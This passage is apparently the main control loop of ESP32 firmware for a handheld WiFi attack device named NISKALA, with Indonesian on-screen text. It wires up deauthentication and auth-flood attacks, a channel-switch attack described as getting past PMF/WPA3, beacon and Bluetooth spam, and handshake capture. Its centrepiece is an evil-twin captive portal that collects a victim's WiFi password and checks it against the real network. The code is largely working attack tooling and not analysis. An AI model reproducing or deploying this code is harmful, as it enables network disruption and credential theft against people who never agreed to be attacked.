        if (off + 2 <= d + dlen) {
          uint16_t acount = p[off] | (p[off + 1] << 8);
          off += 2 + acount * 4;
          if (off + 2 <= d + dlen) {
            uint16_t caps = p[off] | (p[off + 1] << 8);
            g_pmfEnabled = (caps & 0x00C0) != 0; // bit 6 = capable, bit 7 = required
            g_pmfFound = true;
          }
        }
      }
      break;
    }
    pos += 2 + len;
  }
}

bool detectPMFExact(const uint8_t* bssid, uint8_t channel) {
  g_pmfFound = false;
  g_pmfEnabled = false;
  memcpy(g_pmfBSSID, bssid, 6);

  radioSetMode(RADIO_AP_STA);
  delay(50);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(50);

  wifi_promiscuous_filter_t filter;
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(pmfCaptureCb);
  esp_wifi_set_promiscuous(true);

  unsigned long start = millis();
  while (!g_pmfFound && (millis() - start) < 1500) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) break;
    delay(10);
  }

  esp_wifi_set_promiscuous(false);
  radioSetMode(RADIO_STA);
  return g_pmfEnabled;
}

bool detectPMF(int idx) {
  wifi_ap_record_t records[32];
  uint16_t count = 32;
  if (esp_wifi_scan_get_ap_records(&count, records) != ESP_OK) return false;
  if (idx >= count) return false;

  wifi_auth_mode_t m = records[idx].authmode;
  if (m == WIFI_AUTH_WPA3_PSK || m == WIFI_AUTH_WPA2_WPA3_PSK) return true;

  // WPA2 bisa tetap aktif PMF (802.11w) -> deteksi presisi dari beacon RSN
  uint8_t bssid[6];
  memcpy(bssid, records[idx].bssid, 6);
  return detectPMFExact(bssid, records[idx].primary);
}

// ═══════════════════════════════════════════════
// Verification
// ═══════════════════════════════════════════════
void beginVerification() {
  isReleasing = false;
  isVerifying = true;
  verifyState = 1;
  verifyStart = millis();
  Serial.printf("[VERIFY] Attempt %d/%d starting\n",
                verifyAttempts + 1, MAX_VERIFY_ATTEMPTS);
  esp_wifi_set_promiscuous(false);
  g_attackMode = ATK_IDLE;
  WiFi.disconnect();
  delay(100);
  WiFi.begin(targetSSID.c_str(), capturedPass.c_str(), g_targetChannel, g_targetBSSID);
}

void updateVerification() {
  if (!isVerifying) return;

  if (WiFi.status() == WL_CONNECTED) {
    verificationResult = true;
    WiFi.disconnect();
    updatePasswordVerification(true);
    isVerifying = false;
    verifyAttempts = 0;
    verifyState = 2;
    releaseAfterSuccess = millis() + SUCCESS_HOLD_MS;
    Serial.println("[VERIFY] PASSWORD BENAR");
    return;
  }

  if (millis() - verifyStart > VERIFY_TIMEOUT_MS) {
    WiFi.disconnect();
    updatePasswordVerification(false);
    isVerifying = false;
    verifyAttempts++;

    Serial.printf("[VERIFY] Attempt %d/%d FAILED\n",
                  verifyAttempts, MAX_VERIFY_ATTEMPTS);

    if (verifyAttempts >= MAX_VERIFY_ATTEMPTS) {
      verifyState = 0;
      verifyAttempts = 0;
      stopEvilTwin();
      tft.fillScreen(TFT_BLACK);
      drawHeader("MAX PERCOBAAN", TFT_RED);
      tft.setTextFont(2); tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.setCursor(10, 40); tft.println("5x password salah.");
      tft.setCursor(10, 60); tft.println("Target dilepas.");
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      tft.setCursor(10, 85); tft.println("Kembali ke menu...");
      transientActive = true;
      transientUntil = millis() + 2500;
      transientMode = 1;
      return;
    }

    verifyState = 3;
    isReleasing = false;
    esp_wifi_set_promiscuous(true);
    g_attackMode = ATK_EVIL_TWIN;

    tft.fillScreen(TFT_BLACK);
    drawHeader("PASSWORD SALAH", TFT_RED);
    tft.setTextFont(2); tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setCursor(10, 40); tft.println("Password salah.");
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.setCursor(10, 62);
    tft.print("Percobaan: "); tft.print(verifyAttempts);
    tft.print("/"); tft.println(MAX_VERIFY_ATTEMPTS);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setCursor(10, 85); tft.println("Target input ulang...");
    transientActive = true;
    transientUntil = millis() + 1500;
    transientMode = 2;
    return;
  }
}

// ═══════════════════════════════════════════════
// Navigation
// ═══════════════════════════════════════════════


void handleAPListNavigation() {
  if (digitalRead(BTN_TOP) == LOW) {
    delay(200);
    selectedIdx++;
    if (selectedIdx > apCount) selectedIdx = 0;
    drawAPList();
  }
  if (digitalRead(BTN_BOTTOM) == LOW) {
    delay(200);
    if (selectedIdx == apCount) {
      currentState = MAIN_MENU; drawMainMenu();
    } else {
      memcpy(g_targetBSSID, WiFi.BSSID(selectedIdx), 6);
      g_targetChannel = WiFi.channel(selectedIdx);
      targetSSID = WiFi.SSID(selectedIdx);

      if (currentState == RECON_AP_SELECT) {
        g_reconSelectedAuth = (int)WiFi.encryptionType(selectedIdx);
        currentState = RECON;
        startNetworkRecon();
        while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
        return;
      }

      if (currentState == AP_LIST_CLIENT) {
        currentState = CLIENT_MONITOR_RUNNING;
        startClientMonitor();
        drawClientMonitor();
        while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
        return;
      }
      if (currentState == AP_LIST_CSA) {
        currentState = CSA_RUNNING;
        startCSAAttack();
        drawCSARunning(0);
        while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
        return;
      }
      if (currentState == AP_LIST_EAPOL) {
        currentState = EAPOL_CAPTURE_RUNNING;
        startEapolCapture();
        while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
        return;
      }

      if (currentState == AP_LIST_SMART) {
        currentState = SMART_PROFILE;
        drawSmartProfile();
        while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
        return;
      }

      // [PATCH 2] PMF terdeteksi → tawarkan CSA
      if (detectPMF(selectedIdx)) {
        tft.fillScreen(TFT_BLACK);
        drawHeader("TARGET PMF/WPA3", TFT_ORANGE);
        tft.setTextFont(2); tft.setTextColor(TFT_YELLOW, TFT_BLACK);
        tft.setCursor(10, 30); tft.println("Target pakai PMF/WPA3.");
        tft.setCursor(10, 48); tft.println("Deauth TIDAK berhasil.");
        tft.setTextColor(TFT_GREEN, TFT_BLACK);
        tft.setCursor(10, 70); tft.println("Gunakan CSA Attack —");
        tft.setCursor(10, 88); tft.println("tembus PMF via beacon");
        tft.setCursor(10, 106); tft.println("channel switch sah.");
        drawFooter("ATAS=Batal | BAWAH=CSA");

        while (digitalRead(BTN_TOP) != LOW && digitalRead(BTN_BOTTOM) != LOW) delay(50);
        delay(300);

        if (digitalRead(BTN_BOTTOM) == LOW) {
          currentState = CSA_RUNNING;
          startCSAAttack();
          drawCSARunning(0);
          while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
        } else {
          currentState = MAIN_MENU;
          drawMainMenu();
        }
        return;
      }
      if (currentState == AP_LIST_DEAUTH) {
        currentState = DEAUTH_MENU;
        startDeauthEngine();
        drawDeauthMenu();
      } else if (currentState == AP_LIST_EVIL_TWIN) {
        currentState = TEMPLATE_SELECT;
        templateSelection = 0;
        drawTemplateSelect();
      } else if (currentState == AP_LIST_AUTH_FLOOD) {
        currentState = AUTH_FLOOD_RUNNING;
        startAuthFlood();
        drawAuthFlood(0);
      }
    }
  }
}

void handleTemplateSelect() {
  if (digitalRead(BTN_TOP) == LOW) {
    delay(200);
    templateSelection = (templateSelection + 1) % TEMPLATE_COUNT;
    drawTemplateSelect();
  }
  if (digitalRead(BTN_BOTTOM) == LOW) {
    delay(200);
    if (templateSelection == 5) {
      currentState = FETCH_TEMPLATE;
      startFetchCustomTemplate();
      while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
      return;
    } else {
      selectedTemplateIdx = templateSelection;
      useCustomTemplate = false;
      currentState = EVIL_TWIN_RUNNING;
      verifyAttempts = 0;
      verifyState = 0;
      startEvilTwinWithDeauth();
      drawEvilTwinRunning(0);
    }
  }
}

void handleKarmaResults() {
  if (digitalRead(BTN_TOP) == LOW) {
    delay(200);
    karmaSelection++;
    if (karmaSelection > g_karmaSSIDCount) karmaSelection = 0;
    if (karmaSelection >= karmaScrollPos + 4) karmaScrollPos = karmaSelection - 3;
    else if (karmaSelection < karmaScrollPos) karmaScrollPos = karmaSelection;
    drawKarmaResults();
  }
  if (digitalRead(BTN_BOTTOM) == LOW) {
    delay(200);

    if (karmaSelection >= g_karmaSSIDCount) {
      karmaSelection = 0;
      karmaScrollPos = 0;
      currentState = MAIN_MENU;
      drawMainMenu();
      return;
    }

    String selectedSSID = String(g_karmaSSIDs[karmaSelection].ssid);
    int probes = g_karmaSSIDs[karmaSelection].probeCount;
    Serial.printf("[KARMA] Selected: %s (%d probes)\n", selectedSSID.c_str(), probes);

    tft.fillScreen(TFT_BLACK);
    drawHeader("MENCARI AP ASLI...", TFT_ORANGE);
    tft.setTextFont(2); tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 50);
    tft.print("SSID: "); tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.println(selectedSSID.substring(0, 20));
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.setCursor(10, 80); tft.println("Scanning...");

    uint8_t foundBSSID[6] = {0};
    uint8_t foundChannel = 1;
    bool found = false;

    delay(100);
    int n = WiFi.scanNetworks(false, true);
    for (int i = 0; i < n; i++) {
      if (WiFi.SSID(i) == selectedSSID) {
        memcpy(foundBSSID, WiFi.BSSID(i), 6);
        foundChannel = WiFi.channel(i);
        found = true;
        break;
      }
    }

    memcpy(g_targetBSSID, foundBSSID, 6);
    g_targetChannel = foundChannel;
    targetSSID = selectedSSID;

    if (found) {
      Serial.printf("[KARMA] Found AP: BSSID=%02X:%02X:%02X:%02X:%02X:%02X ch=%d\n",
                    g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
                    g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
                    g_targetChannel);
    } else {
      Serial.printf("[KARMA] AP not found — Evil Twin without deauth target\n");
    }

    verifyAttempts = 0;
    verifyState = 0;
    currentState = EVIL_TWIN_RUNNING;
    startEvilTwinWithDeauth();
    drawEvilTwinRunning(0);
  }
}

void startApScan(int pendingMenu) {
  g_scanPendingMenu = pendingMenu;
  g_scanFrame = 0;
  g_scanLastDraw = 0;
  currentState = AP_SCANNING;
  tft.fillScreen(TFT_BLACK);
  drawScanAnimation(0);
  WiFi.scanNetworks(true, true);
}

void apScanTick() {
  int n = WiFi.scanComplete();
  if (n >= 0) {
    apCount = n;
    int menu = g_scanPendingMenu;
    g_scanPendingMenu = -1;
    if (menu == 0) { currentState = AP_LIST_DEAUTH; }
    else if (menu == 1) { currentState = AP_LIST_EVIL_TWIN; }
    else if (menu == 5) { currentState = AP_LIST_AUTH_FLOOD; }
    else if (menu == 9) { currentState = AP_LIST_CSA; }
    else if (menu == 15) { currentState = AP_LIST_CLIENT; }
    else if (menu == 16) { currentState = RECON_AP_SELECT; }
    else if (menu == 18) { currentState = AP_LIST_EAPOL; }
    else if (menu == 19) { currentState = AP_LIST_SMART; }
    else { currentState = MAIN_MENU; }
    selectedIdx = 0; apScrollPos = 0;
    if (apCount > 0) drawAPList();
    else {
      tft.fillScreen(TFT_BLACK);
      drawHeader("NO WIFI FOUND", TFT_RED);
      delay(250);
      drawMainMenu();
      currentState = MAIN_MENU;
    }
  } else if (n == -2) {
    apCount = 0;
    g_scanPendingMenu = -1;
    currentState = MAIN_MENU;
    drawMainMenu();
  } else if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
    WiFi.scanDelete();
    apCount = -1;
    g_scanPendingMenu = -1;
    delay(200);
    currentState = MAIN_MENU;
    drawMainMenu();
  } else if (millis() - g_scanLastDraw > 60) {
    drawScanAnimation(g_scanFrame++);
    g_scanLastDraw = millis();
  }
}

// ═══════════════════════════════════════════════
// Disclaimer
// ═══════════════════════════════════════════════
void showDisclaimerFlow() {
  while (true) {
    drawDisclaimerScreen(tft, "v" FW_VERSION);
    while (digitalRead(BTN_TOP) != LOW && digitalRead(BTN_BOTTOM) != LOW) delay(50);
    delay(300);
    drawConfirmationScreen(tft);
    bool cancelled = false;
    while (true) {
      if (digitalRead(BTN_TOP) == LOW) { delay(300); cancelled = true; break; }
      if (digitalRead(BTN_BOTTOM) == LOW) { delay(300); break; }
      delay(50);
    }
    if (!cancelled) return;
  }
}

// ═══════════════════════════════════════════════
// Setup
// ═══════════════════════════════════════════════


void setup() {
  Serial.begin(115200);
  randomSeed(esp_random());
  delay(300);
  Serial.println();
  Serial.println("==== NISKALA v" FW_VERSION " ====");
  Serial.printf("Chip : %s rev %d\n", ESP.getChipModel(), ESP.getChipRevision());
  Serial.printf("Heap : %u bytes\n", ESP.getFreeHeap());

  pinMode(BTN_TOP, INPUT_PULLUP);
  pinMode(BTN_BOTTOM, INPUT_PULLUP);
  analogSetPinAttenuation(BAT_PIN, ADC_11db);
  prefs.begin("deauther", false);
  apPrefs.begin("deauther_ap", false);

  cfg_deauth_burst = prefs.getInt("cfg_deauth", 5);
  cfg_auth_burst = prefs.getInt("cfg_auth", 20);
  cfg_hop_interval_ms = prefs.getInt("cfg_hop", 120);
  cfg_beacon_hop_ms = prefs.getInt("cfg_beacon", 100);
  cfg_deauth_reason = prefs.getInt("cfg_reason", 0);
  { String _s = prefs.getString("wifi_ssid", ""); if (_s.length() > 0) cfg_wifi_ssid = _s; }
  { String _s = prefs.getString("wifi_pass", ""); if (_s.length() > 0) cfg_wifi_pass = _s; }
  { String _s = prefs.getString("srv_url", ""); if (_s.length() > 0) cfg_server_url = _s; }
  { String _s = prefs.getString("tpl_url", ""); if (_s.length() > 0) cfg_template_url = _s; }
  cfg_autosync_min = prefs.getInt("autosync", 0);
  lastAutoSync = millis();

  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.onNotFound(handleNotFound);
  setupWebRemote();

  tft.init();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);

  Serial.println("[1/4] Splash...");
  drawElegantSplash();

  Serial.println("[2/4] Disclaimer...");
  showDisclaimerFlow();

  radioSetMode(RADIO_AP_STA);
  esp_wifi_get_mac(WIFI_IF_AP, g_originalApMac);
  radioSetMode(RADIO_STA);
  WiFi.disconnect();

  Serial.println("[3/4] Start attack task...");
  xTaskCreatePinnedToCore(
    attackTask, "attack", 4096, NULL, 2, &attackTaskHandle, 0
  );

  Serial.println("[4/4] Draw main menu...");
  drawMainMenu();

  Serial.println("Setup selesai, heap tersisa: " + String(ESP.getFreeHeap()));
  Serial.println("Ketik 'help' untuk CLI (Serial Monitor 115200).");
  lastActivity = millis();
}

// ═══════════════════════════════════════════════
// Loop
// ═══════════════════════════════════════════════
static unsigned long lastUI = 0;
static int animFrame = 0;

void loop() {
  handleSerialCLI();

  // ---- Screensaver (dim + particle orbit) ----
  bool anyBtn = (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW);
  if (screensaverActive) {
    if (anyBtn) {
      screensaverActive = false;
      setBacklight(BL_FULL);
      lastActivity = millis();
      if (currentState == MAIN_MENU) drawMainMenu();
      delay(200);
      return;
    }
    if (millis() - lastScreensaverDraw > 70) {
      drawButterflyScreensaver(screensaverFrame++);
      lastScreensaverDraw = millis();
    }
    return;
  }
  if (anyBtn) lastActivity = millis();
  if (currentState == MAIN_MENU && millis() - lastActivity > SCREENSAVER_IDLE_MS) {
    screensaverActive = true;
    screensaverFrame = 0;
    setBacklight(BL_DIM);
    drawButterflyScreensaver(0);
    return;
  }
  // ---- end screensaver ----

  // Non-blocking transient info (verification result hold)
  if (transientActive) {
    if (transientMode == 2) {
      dnsServer.processNextRequest();
      server.handleClient();
    }
    if (millis() > transientUntil) {
      transientActive = false;
      if (transientMode == 1) {
        currentState = MAIN_MENU;
        drawMainMenu();
      } else {
        drawEvilTwinRunning(0);
      }
    }
    return;
  }

  // ── KARMA_SCAN ──
  if (currentState == KARMA_SCAN && isKarmaRunning) {
    if (millis() - lastUI > 200) { drawKarmaScan(animFrame++); lastUI = millis(); }

    if (millis() - karmaScanStart > KARMA_SCAN_DURATION_MS) {
      stopKarmaScan();
      sortKarmaSSIDs();
      karmaSelection = 0;
      karmaScrollPos = 0;
      currentState = KARMA_RESULTS;
      drawKarmaResults();
      return;
    }

    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopKarmaScan();
      currentState = MAIN_MENU;
      drawMainMenu();
    }
    return;
  }

  // ── KARMA_RESULTS ──
  if (currentState == KARMA_RESULTS) {
    handleKarmaResults();
    return;
  }

  // ── EVIL_TWIN: success ──
  if (verifyState == 2 && isEvilTwinRunning) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopEvilTwin();
      verifyState = 0;
      verifyAttempts = 0;
      currentState = MAIN_MENU;
      drawMainMenu();
      return;
    }
    dnsServer.processNextRequest();
    server.handleClient();
    if (millis() - lastUI > 400) {
      tft.fillScreen(TFT_BLACK);
      drawHeader("PASSWORD BENAR!", TFT_GREEN);
      tft.setTextFont(2); tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.setCursor(10, 40); tft.println("Verifikasi sukses.");
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      tft.setCursor(10, 62); tft.println("Target akan dilepas");
      int remain = (releaseAfterSuccess > millis()) ?
                   ((releaseAfterSuccess - millis()) / 1000 + 1) : 0;
      tft.setCursor(10, 82);
      tft.print("dalam "); tft.print(remain); tft.println(" detik...");
      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
      tft.setCursor(10, 102); tft.print("Pass:");
      drawWrapped(capturedPass, 70, 102, 160, TFT_WHITE, 14);
      lastUI = millis();
    }
    if (millis() > releaseAfterSuccess) {
      stopEvilTwin();
      verifyState = 0;
      currentState = MAIN_MENU;
      drawMainMenu();
    }
    return;
  }

  // ── EVIL_TWIN: verifying ──
  if (isVerifying) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopEvilTwin();
      verifyState = 0;
      verifyAttempts = 0;
      currentState = MAIN_MENU;
      drawMainMenu();
      return;
    }
    updateVerification();
    if (millis() - lastUI > 200) { drawEvilTwinRunning(animFrame++); lastUI = millis(); }
    return;
  }

  // ── EVIL_TWIN: normal ──
  if (isEvilTwinRunning) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopEvilTwin();
      verifyState = 0;
      verifyAttempts = 0;
      currentState = MAIN_MENU;
      drawMainMenu();
      return;
    }
    if (isReleasing) {
      if (millis() - releaseTimer > RELEASE_DELAY_MS) {
        beginVerification();
        return;
      }
    }
    dnsServer.processNextRequest();
    server.handleClient();
    if (millis() - lastUI > 150) { drawEvilTwinRunning(animFrame++); lastUI = millis(); }
    return;
  }

  // ── CSA ──
  if (currentState == CSA_RUNNING && isCSARunning) {
    if (millis() - lastUI > 180) { drawCSARunning(animFrame++); lastUI = millis(); }
  }

  // ── Fitur lain ──
  if (currentState == DEAUTH_MENU && isDeauthRunning) {
    if (millis() - lastUI > 200) { drawDeauthMenu(); lastUI = millis(); }
  }
  if (currentState == GLOBAL_DEAUTH && isGlobalDeauthRunning) {
    if (millis() - lastUI > 150) { drawGlobalDeauth(animFrame++); lastUI = millis(); }
  }
  if (currentState == AUTH_FLOOD_RUNNING && isAuthFloodRunning) {
    if (millis() - lastUI > 200) { drawAuthFlood(animFrame++); lastUI = millis(); }
  }
  if (currentState == BEACON_SPAM && isBeaconRunning) {
    if (millis() - lastUI > 180) { drawBeaconSpam(animFrame++); lastUI = millis(); }
  }
  if (currentState == PROBE_SNIFF && isProbeRunning) {
    if (millis() - lastUI > 250) { drawProbeSniff(animFrame++); lastUI = millis(); }
  }
  if (currentState == BT_SPAM && isBTSpamRunning) {
    btSpamTick();
    if (millis() - lastUI > 200) { drawBTSpam(animFrame++); lastUI = millis(); }
  }
  if (currentState == MACRO_RUNNING && isMacroRunning) {
    macroTick();
  }

  if (currentState == MAIN_MENU) {
    if (cfg_autosync_min > 0 && (millis() - lastAutoSync) >= (unsigned long)cfg_autosync_min * 60000UL) {
      lastAutoSync = millis();
      currentState = CLOUD_SYNC;
      startCloudSync();
    }
    if (digitalRead(BTN_TOP) == LOW) {
      delay(200);
      menuSelection = (menuSelection + 1) % MENU_COUNT;
      if (menuSelection >= menuScrollPos + 4) menuScrollPos = menuSelection - 3;
      else if (menuSelection < menuScrollPos) menuScrollPos = menuSelection;
      drawMainMenu();
    }
    if (digitalRead(BTN_BOTTOM) == LOW) {
      delay(200);
      switch (menuSelection) {
        case 0: case 1: case 5:
          startApScan(menuSelection);
          break;
        case 2:
          currentState = BEACON_SPAM;
          startBeaconSpam();
          drawBeaconSpam(0);
          break;
        case 3:
          currentState = PROBE_SNIFF;
          startProbeSniffer();
          drawProbeSniff(0);
          break;
        case 4:
          currentState = GLOBAL_DEAUTH;
          startGlobalDeauth();
          drawGlobalDeauth(0);
          break;
        case 6:
          currentState = BT_SPAM;
          startBTSpam();
          drawBTSpam(0);
          break;
        case 7:
          currentState = VIEW_PASSWORDS;
          viewSelection = 0; viewScrollPos = 0; confirmDeleteAll = false;
          if (prefs.getInt("pwd_count", 0) == 0) viewSelection = 1;
          drawViewPasswords();
          break;
        case 8:
          currentState = KARMA_SCAN;
          startKarmaScan();
          drawKarmaScan(0);
          break;
        case 9:
          startApScan(9);
          break;
        case 10:
          currentState = WEB_REMOTE;
          startWebRemote();
          break;
        case 11:
          currentState = OTA_MODE;
          startOTA();
          break;
        case 12:
          currentState = BLE_SCAN;
          startBLEScan();
          break;
        case 13:
          currentState = CLOUD_SYNC;
          startCloudSync();
          break;
        case 14:
          currentState = MACRO_MENU;
          macroSelection = 0;
          drawMacroMenu();
          break;
        case 15:
          startApScan(15);
          break;
        case 16:
          startApScan(16);
          break;
        case 19:
          startApScan(19);
          break;
        case 18:
          startApScan(18);
          break;
        case 17:
          currentState = APWIFI_VIEW;
          apWifiSelection = 0;
          apWifiScrollPos = 0;
          confirmApWifiDelete = false;
          drawApWifiView();
          break;
      }
    }
  }
  else if (currentState == AP_SCANNING) {
    apScanTick();
  }
  else if (currentState == AP_LIST_DEAUTH ||
           currentState == AP_LIST_EVIL_TWIN ||
           currentState == AP_LIST_AUTH_FLOOD ||
           currentState == AP_LIST_CSA ||
           currentState == AP_LIST_CLIENT ||
           currentState == AP_LIST_EAPOL ||
           currentState == AP_LIST_SMART ||
           currentState == RECON_AP_SELECT) {
    handleAPListNavigation();
  }
  else if (currentState == FETCH_TEMPLATE) {
    templateFetchTick();
    if (currentState == FETCH_TEMPLATE && (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW)) {
      delay(200);
      WiFi.disconnect();
      restoreOriginalApMac();
      radioSetMode(RADIO_STA);
      currentState = TEMPLATE_SELECT;
      drawTemplateSelect();
    }
  }
  else if (currentState == TEMPLATE_SELECT) {
    handleTemplateSelect();
  }
  else if (currentState == DEAUTH_MENU) {
    if (digitalRead(BTN_BOTTOM) == LOW) {
      delay(200);
      if (isDeauthRunning) stopDeauthEngine(); else startDeauthEngine();
      drawDeauthMenu();
    }
    if (digitalRead(BTN_TOP) == LOW) {
      delay(200);
      if (isDeauthRunning) stopDeauthEngine();
      currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == CSA_RUNNING) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopCSAAttack();
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == EVIL_TWIN_RUNNING) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopEvilTwin();
      verifyState = 0;
      verifyAttempts = 0;
      currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == BEACON_SPAM) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300); stopBeaconSpam(); currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == PROBE_SNIFF) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300); stopProbeSniffer(); currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == GLOBAL_DEAUTH) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300); stopGlobalDeauth(); currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == AUTH_FLOOD_RUNNING) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300); stopAuthFlood(); currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == BT_SPAM) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300); stopBTSpam(); currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == CLOUD_SYNC) {
    cloudSyncTick();
    if (currentState == CLOUD_SYNC && (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW)) {
      delay(200);
      WiFi.disconnect();
      restoreOriginalApMac();
      radioSetMode(RADIO_STA);
      g_cloudPhase = CLOUD_PHASE_IDLE;
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == WEB_REMOTE) {
    if (isKarmaRunning && millis() - karmaScanStart > KARMA_SCAN_DURATION_MS) {
      stopAttacksKeepWebRemote();
      currentState = WEB_REMOTE;
      Serial.println("[KARMA] Web scan selesai, AP kontrol tetap aktif");
    }
    dnsServer.processNextRequest();
    server.handleClient();
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopWebRemote();
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == OTA_MODE) {
    ArduinoOTA.handle();
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopOTA();
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == BLE_SCAN) {
    if (g_bleScanning && millis() - lastUI > 500) { drawBleScan(); lastUI = millis(); }
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopBLEScan();
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == MACRO_MENU) {
    if (digitalRead(BTN_TOP) == LOW) {
      delay(200);
      macroSelection = (macroSelection + 1) % MACRO_COUNT;
      drawMacroMenu();
    }
    if (digitalRead(BTN_BOTTOM) == LOW) {
      delay(200);
      startMacro(macroSelection);
    }
  }
  else if (currentState == MACRO_RUNNING) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopAllAttacks();
      isMacroRunning = false;
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == CLIENT_MONITOR_RUNNING) {
    if (millis() - lastUI > 500) { drawClientMonitor(); lastUI = millis(); }
    if (digitalRead(BTN_TOP) == LOW) {
      delay(200);
      clientSelection++;
      if (clientSelection > g_clientCount) clientSelection = 0;
      if (clientSelection < clientScroll) clientScroll = clientSelection;
      else if (clientSelection >= clientScroll + 4) clientScroll = clientSelection - 3;
      drawClientMonitor();
    }
    if (digitalRead(BTN_BOTTOM) == LOW) {
      delay(200);
      if (clientSelection == g_clientCount) {
        stopClientMonitor();
        currentState = MAIN_MENU;
        drawMainMenu();
      } else if (g_clientCount > 0 && clientSelection < g_clientCount) {
        uint8_t* cmac = g_clients[clientSelection].mac;
        for (int i = 0; i < cfg_deauth_burst; i++) {
          sendDeauthFrame(cmac, g_targetBSSID, 0x07);
        }
        Serial.printf("[CLIENT] Deauth %02X:%02X:%02X:%02X:%02X:%02X\n",
          cmac[0], cmac[1], cmac[2], cmac[3], cmac[4], cmac[5]);
        tft.fillRect(0, 104, 240, 10, TFT_BLACK);
        tft.setTextFont(1);
        tft.setTextColor(TFT_RED, TFT_BLACK);
        tft.setCursor(4, 104);
        tft.print("DEAUTH OK");
      }
    }
  }
  else if (currentState == SMART_PROFILE) {
    if (digitalRead(BTN_TOP) == LOW) {
      delay(200);
      currentState = MAIN_MENU;
      drawMainMenu();
    }
    if (digitalRead(BTN_BOTTOM) == LOW) {
      delay(200);
      startSmartRecommendedAttack();
      while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
    }
  }
  else if (currentState == EAPOL_CAPTURE_RUNNING) {
    eapolCaptureTick();
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(200);
      stopEapolCapture();
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == RECON) {
    if (g_reconPhase == RECON_PHASE_HOST_LIST) {
      if (digitalRead(BTN_TOP) == LOW) {
        delay(200);
        g_reconSelection++;
        if (g_reconSelection > g_reconHostCount) g_reconSelection = 0;
        if (g_reconSelection < g_reconScroll) g_reconScroll = g_reconSelection;
        else if (g_reconSelection >= g_reconScroll + 4) g_reconScroll = g_reconSelection - 3;
        drawNetworkRecon();
      }
      if (digitalRead(BTN_BOTTOM) == LOW) {
        delay(200);
        if (g_reconSelection == g_reconHostCount) {
          stopNetworkRecon();
          currentState = MAIN_MENU;
          drawMainMenu();
        } else if (g_reconHostCount > 0 && g_reconSelection < g_reconHostCount) {
          reconPortScan(g_reconSelection);
        }
      }
